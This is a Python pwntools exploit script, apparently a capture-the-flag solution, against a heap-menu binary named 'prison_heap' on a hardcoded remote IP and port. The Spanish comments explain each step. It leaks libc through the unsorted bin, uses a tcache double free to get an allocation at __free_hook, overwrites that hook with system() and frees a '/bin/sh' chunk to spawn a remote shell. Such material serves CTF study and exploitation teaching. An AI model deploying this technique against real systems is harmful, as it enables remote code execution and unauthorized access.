#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 161.35.30.233 --port 1337 ./prison_heap
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./prison_heap')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '161.35.30.233'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env={"LD_PRELOAD":"./libc-2.27.so"}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

idx=0

def write_prison(size, s=None):
    global idx
    if s==None:
        s = str(idx) * size
    idx+=1

    io.sendline("1")
    io.sendline(str(size))
    io.recvline_contains("Enter the name of the ")
    io.sendline(s)

def free_prison(idx):
    io.sendline("2")
    io.recvline_contains("Choose the index prison ")
    io.sendline(str(idx))

def read_prison(idx):
    io.sendline("3")
    io.recvline_contains("Choose the index prison for read")
    io.sendline(str(idx))
    return io.recvline()

io = start()

libc = exe.libc

# Creamos dos chunks y liberamos el primero 7 veces
write_prison(0xf8) #0
write_prison(0x20) #1
for i in range(7):
    free_prison(0)

# Al liberarlo de nuevo, entrará al unsorted bin con el fd apuntando al main_arena
free_prison(0)

# Leemos el fd
libc_arena = unpack(read_prison(0)[:6]+"\x00\x00")

# Con el libc_arena, y habiendo hecho los cálculos para esta libc, sabemos que está a 0x3ebca0 bytes del inicio de la libc
arena_offset = 0x3ebca0
# Establecemos la dirección base, de forma que cuando le pidamos símbolos al objeto libc, nos de direcciones reales para esta ejecución
libc.address = libc_arena - arena_offset

# Logging
log.info("Libc arena: %16x", libc_arena)
log.info("Libc base:  %16x", libc.address)


# Ahora vamos a generar un chunk en la posición de free_hook. Freehook, cuando está definido, hace que se llame a esa función, con el chunk como parámetro
# Así, si metemos en ese hook la direccioń de system(), al liberar un bloque hará  system(chunk_address), y si ese chunk lo hemos creado previamente
# con un comando, lo ejecutará

# como hemos ajustado la direcion base de libc, los symbolos tienen la dirección completa actual
target_chunk = libc.sym['__free_hook']
log.info("Target_chunk: %16x", target_chunk)

# creamos un chunk y lo liberamos dos veces. Es un tamaño distinto a los anteriores(0x68). 
# Los dos chunks liberados se meterán en el tcache, y sucesivos malloc nos darán chunks en la misma posición de memoria
write_prison(0x68) #2
free_prison(2)
free_prison(2)

# Pedimos un nuevo chunk, y le metemos un contenido que establecerá el fd, que es el puntero al siguiente chunk.
write_prison(0x68, pack(target_chunk))   #3

# Reservamos de nuevo otro chunk, esta vez sin modificar su contenido. 
write_prison(0x68, "") #4

# Ahora, la lista de chunks de tcache empieza en la dirección de free_hook. El siguiente chunk que pidamos, apuntará a esa dirección
write_prison(0x68, pack(libc.sym['system'])) #5

write_prison(0x30, "/bin/sh\x00") #6
free_prison(6)

io.interactive()

